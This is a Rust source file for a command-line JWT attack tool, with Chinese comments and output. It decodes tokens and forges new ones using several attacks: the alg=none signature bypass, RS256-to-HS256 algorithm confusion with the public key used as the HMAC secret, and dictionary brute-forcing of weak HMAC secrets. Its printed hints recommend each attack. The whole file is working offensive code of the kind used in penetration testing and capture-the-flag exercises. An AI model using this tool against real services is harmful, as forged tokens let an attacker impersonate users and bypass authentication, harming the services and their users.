//! jwt - JWT 解码/伪造/算法混淆/弱密钥爆破
//! 纯 Rust 实现, 不再依赖 python3

use base64::engine::general_purpose::{STANDARD, URL_SAFE_NO_PAD};
use base64::Engine;
use clap::Parser;
use common::{exit, finish, Mode, Out};
use hmac::{Hmac, Mac};
use serde::Serialize;
use serde_json::Value;
use sha2::{Sha256, Sha384, Sha512};
use std::process::ExitCode;

#[derive(Parser, Debug)]
#[command(
    name = "jwt",
    version,
    about = "JWT 解码/伪造/爆破(零依赖)",
    long_about = "命令: decode|forge|confuse|brute (默认 decode)\n\n\
                  退出码: 0=成功 1=无结果 2=用法错误 3=运行错误"
)]
struct Args {
    /// decode|forge|confuse|brute (默认 decode)
    #[arg(value_name = "CMD")]
    cmd: Option<String>,

    /// JWT token
    #[arg(value_name = "TOKEN")]
    token: Option<String>,

    /// forge 算法(默认 none)
    #[arg(long, default_value = "none")]
    alg: String,

    /// forge HS256 密钥
    #[arg(long, default_value = "")]
    key: String,

    /// 伪造的 payload JSON
    #[arg(long, default_value = "")]
    payload: String,

    /// confuse 的公钥文件
    #[arg(long, default_value = "")]
    pubkey: String,

    /// brute 字典文件
    #[arg(long, default_value = "")]
    dict: String,

    /// JSON 输出
    #[arg(long)]
    json: bool,
}

#[derive(Serialize)]
struct DecodeReport {
    header: Value,
    payload: Value,
    #[serde(skip_serializing_if = "Option::is_none")]
    signature: Option<String>,
    hints: Vec<String>,
}

#[derive(Serialize)]
struct ForgeReport {
    alg: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    key: Option<String>,
    token: String,
    header: Value,
    payload: Value,
}

#[derive(Serialize)]
struct ConfuseReport {
    alg: String,
    pubkey: String,
    token: String,
    header: Value,
    payload: Value,
}

#[derive(Serialize)]
struct BruteReport {
    alg: String,
    found: bool,
    #[serde(skip_serializing_if = "Option::is_none")]
    key: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    token: Option<String>,
    attempts: usize,
}

struct Decoded {
    header: Value,
    payload: Value,
    parts: Vec<String>,
}

fn b64url_encode(b: &[u8]) -> String {
    URL_SAFE_NO_PAD.encode(b)
}

fn b64url_decode(s: &str) -> Result<Vec<u8>, String> {
    let filtered: String = s.chars().filter(|c| !c.is_ascii_whitespace()).collect();
    let mut t = filtered.replace('-', "+").replace('_', "/");
    let pad = (4 - t.len() % 4) % 4;
    for _ in 0..pad {
        t.push('=');
    }
    STANDARD
        .decode(t.as_bytes())
        .map_err(|e| format!("base64 解码失败: {e}"))
}

fn parse_json_part(part: &str) -> Result<Value, String> {
    let raw = b64url_decode(part)?;
    serde_json::from_slice(&raw).map_err(|e| format!("JSON 解析失败: {e}"))
}

fn parse_token(token: &str) -> Result<Decoded, String> {
    let parts: Vec<String> = token.split('.').map(str::to_string).collect();
    if parts.len() < 2 {
        return Err("不是合法的 JWT(至少 header.payload)".to_string());
    }
    let header = parse_json_part(&parts[0])?;
    let payload = parse_json_part(&parts[1])?;
    Ok(Decoded {
        header,
        payload,
        parts,
    })
}

fn pretty(v: &Value) -> String {
    serde_json::to_string_pretty(v).unwrap_or_default()
}

fn hints(header: &Value) -> Vec<String> {
    let alg = header.get("alg").and_then(Value::as_str).unwrap_or("");
    if alg == "none" {
        vec!["alg=none: 直接删签名段即可伪造".to_string()]
    } else if alg == "HS256" {
        vec!["HS256 弱密钥: jwt brute <token> --dict 字典".to_string()]
    } else if alg.starts_with("RS") {
        vec!["RS 系列: 若服务端拿公钥验签, 可试算法混淆(HS256+公钥当密钥)".to_string()]
    } else {
        Vec::new()
    }
}

fn print_decoded(d: &Decoded) {
    println!("=== Header ===");
    println!("{}", pretty(&d.header));
    println!("=== Payload ===");
    println!("{}", pretty(&d.payload));
    if d.parts.len() == 3 {
        println!("=== Signature ===");
        println!("{}", d.parts[2]);
        println!("=== 提示 ===");
        for h in hints(&d.header) {
            println!("  {h}");
        }
    }
}

fn hmac_sign(alg: &str, key: &[u8], data: &[u8]) -> Vec<u8> {
    match alg {
        "HS384" => {
            let mut mac = Hmac::<Sha384>::new_from_slice(key).expect("HMAC 接受任意长度密钥");
            mac.update(data);
            mac.finalize().into_bytes().to_vec()
        }
        "HS512" => {
            let mut mac = Hmac::<Sha512>::new_from_slice(key).expect("HMAC 接受任意长度密钥");
            mac.update(data);
            mac.finalize().into_bytes().to_vec()
        }
        _ => {
            let mut mac = Hmac::<Sha256>::new_from_slice(key).expect("HMAC 接受任意长度密钥");
            mac.update(data);
            mac.finalize().into_bytes().to_vec()
        }
    }
}

fn sign(header: &Value, payload: &Value, key: &[u8], alg: &str) -> Result<String, String> {
    let h = serde_json::to_string(header).map_err(|e| e.to_string())?;
    let p = serde_json::to_string(payload).map_err(|e| e.to_string())?;
    let data = format!(
        "{}.{}",
        b64url_encode(h.as_bytes()),
        b64url_encode(p.as_bytes())
    );
    match alg {
        "none" => Ok(format!("{data}.")),
        "HS256" | "HS384" | "HS512" => {
            let sig = hmac_sign(alg, key, data.as_bytes());
            Ok(format!("{data}.{}", b64url_encode(&sig)))
        }
        other => Err(format!("不支持的算法: {other}")),
    }
}

fn set_alg(header: &mut Value, alg: &str) -> Result<(), String> {
    match header {
        Value::Object(m) => {
            m.insert("alg".to_string(), Value::String(alg.to_string()));
            Ok(())
        }
        _ => Err("header 不是 JSON 对象".to_string()),
    }
}

fn drop_typ(header: &mut Value) {
    if let Value::Object(m) = header {
        m.shift_remove("typ");
    }
}

fn cmd_decode(token: &str, out: &Out) -> ExitCode {
    let d = match parse_token(token) {
        Ok(d) => d,
        Err(e) => {
            out.error(&e);
            return finish(exit::ERROR);
        }
    };
    let signature = if d.parts.len() == 3 {
        Some(d.parts[2].clone())
    } else {
        None
    };
    let hint_list = if d.parts.len() == 3 {
        hints(&d.header)
    } else {
        Vec::new()
    };
    let report = DecodeReport {
        header: d.header.clone(),
        payload: d.payload.clone(),
        signature,
        hints: hint_list,
    };
    out.emit(|| print_decoded(&d), &report);
    finish(exit::OK)
}

fn cmd_forge(token: &str, alg: &str, key: &str, payload_str: &str, out: &Out) -> ExitCode {
    if payload_str.is_empty() {
        out.error("--payload 必填(JSON)");
        return finish(exit::USAGE);
    }
    let payload: Value = match serde_json::from_str(payload_str) {
        Ok(v) => v,
        Err(e) => {
            out.error(&format!("payload JSON 解析失败: {e}"));
            return finish(exit::ERROR);
        }
    };
    let d = match parse_token(token) {
        Ok(d) => d,
        Err(e) => {
            out.error(&e);
            return finish(exit::ERROR);
        }
    };
    let mut header = d.header.clone();
    if let Err(e) = set_alg(&mut header, alg) {
        out.error(&e);
        return finish(exit::ERROR);
    }
    if alg == "none" {
        drop_typ(&mut header);
    }
    let forge_msg = || {
        if alg == "none" {
            println!("[+] 伪造结果(alg=none):");
        } else {
            println!("[+] 伪造结果(alg={alg}, key={key}):");
        }
    };
    let signed = match sign(&header, &payload, key.as_bytes(), alg) {
        Ok(s) => s,
        Err(e) => {
            if !out.json() {
                print_decoded(&d);
                forge_msg();
            }
            out.error(&e);
            return finish(exit::ERROR);
        }
    };
    let report = ForgeReport {
        alg: alg.to_string(),
        key: if alg == "none" {
            None
        } else {
            Some(key.to_string())
        },
        token: signed.clone(),
        header: header.clone(),
        payload: payload.clone(),
    };
    out.emit(
        || {
            print_decoded(&d);
            forge_msg();
            println!("{signed}");
        },
        &report,
    );
    finish(exit::OK)
}

fn cmd_confuse(token: &str, pubkey_path: &str, out: &Out) -> ExitCode {
    let d = match parse_token(token) {
        Ok(d) => d,
        Err(e) => {
            out.error(&e);
            return finish(exit::ERROR);
        }
    };
    let key = match std::fs::read(pubkey_path) {
        Ok(k) => k,
        Err(e) => {
            out.error(&format!("读取公钥失败: {e}"));
            return finish(exit::ERROR);
        }
    };
    let mut header = d.header.clone();
    if let Err(e) = set_alg(&mut header, "HS256") {
        out.error(&e);
        return finish(exit::ERROR);
    }
    let signed = match sign(&header, &d.payload, &key, "HS256") {
        Ok(s) => s,
        Err(e) => {
            out.error(&e);
            return finish(exit::ERROR);
        }
    };
    let report = ConfuseReport {
        alg: "HS256".to_string(),
        pubkey: pubkey_path.to_string(),
        token: signed.clone(),
        header: header.clone(),
        payload: d.payload.clone(),
    };
    out.emit(
        || {
            print_decoded(&d);
            println!("[+] 算法混淆: RS->HS256, 用公钥 {pubkey_path} 当 HMAC 密钥");
            println!("{signed}");
        },
        &report,
    );
    finish(exit::OK)
}

fn cmd_brute(token: &str, dict_path: &str, out: &Out) -> ExitCode {
    let d = match parse_token(token) {
        Ok(d) => d,
        Err(e) => {
            out.error(&e);
            return finish(exit::ERROR);
        }
    };
    if d.parts.len() < 3 {
        if !out.json() {
            print_decoded(&d);
        }
        out.error("token 缺少签名段");
        return finish(exit::ERROR);
    }
    let alg = d
        .header
        .get("alg")
        .and_then(Value::as_str)
        .unwrap_or("HS256")
        .to_string();
    let data = format!("{}.{}", d.parts[0], d.parts[1]);
    let target = d.parts[2].clone();
    let content = match std::fs::read(dict_path) {
        Ok(c) => c,
        Err(e) => {
            out.error(&format!("读取字典失败: {e}"));
            return finish(exit::ERROR);
        }
    };
    let text = String::from_utf8_lossy(&content);
    let mut attempts = 0usize;
    let mut found: Option<String> = None;
    for line in text.lines() {
        if line.is_empty() {
            continue;
        }
        attempts += 1;
        let sig = b64url_encode(&hmac_sign(&alg, line.as_bytes(), data.as_bytes()));
        if sig == target {
            found = Some(line.to_string());
            break;
        }
    }
    match found {
        Some(k) => {
            let forged = match sign(&d.header, &d.payload, k.as_bytes(), &alg) {
                Ok(s) => s,
                Err(e) => {
                    if !out.json() {
                        print_decoded(&d);
                        println!("[*] 爆破 {alg} 弱密钥...");
                        println!("[+] 找到密钥: {k}");
                    }
                    out.error(&e);
                    return finish(exit::ERROR);
                }
            };
            let report = BruteReport {
                alg: alg.clone(),
                found: true,
                key: Some(k.clone()),
                token: Some(forged.clone()),
                attempts,
            };
            out.emit(
                || {
                    print_decoded(&d);
                    println!("[*] 爆破 {alg} 弱密钥...");
                    println!("[+] 找到密钥: {k}");
                    println!("[+] 伪造: {forged}");
                },
                &report,
            );
            finish(exit::OK)
        }
        None => {
            let report = BruteReport {
                alg: alg.clone(),
                found: false,
                key: None,
                token: None,
                attempts,
            };
            out.emit(
                || {
                    print_decoded(&d);
                    println!("[*] 爆破 {alg} 弱密钥...");
                    println!("[-] 未命中({attempts} 条)");
                },
                &report,
            );
            finish(exit::NO_RESULT)
        }
    }
}

fn main() -> ExitCode {
    common::reset_sigpipe();
    let args = Args::parse();
    let out = Out::new(Mode::from_flag(args.json));

    let (cmd, token) = match (args.cmd, args.token) {
        (Some(c), Some(t)) => (c, t),
        (Some(x), None) | (None, Some(x)) => ("decode".to_string(), x),
        (None, None) => {
            out.error("token 必填");
            return finish(exit::USAGE);
        }
    };

    match cmd.as_str() {
        "decode" => cmd_decode(&token, &out),
        "forge" => cmd_forge(&token, &args.alg, &args.key, &args.payload, &out),
        "confuse" => {
            if args.pubkey.is_empty() {
                out.error("--pubkey 必填");
                return finish(exit::USAGE);
            }
            cmd_confuse(&token, &args.pubkey, &out)
        }
        "brute" => {
            if args.dict.is_empty() {
                out.error("--dict 必填");
                return finish(exit::USAGE);
            }
            cmd_brute(&token, &args.dict, &out)
        }
        _ => {
            out.error("未知命令: decode|forge|confuse|brute");
            finish(exit::USAGE)
        }
    }
}
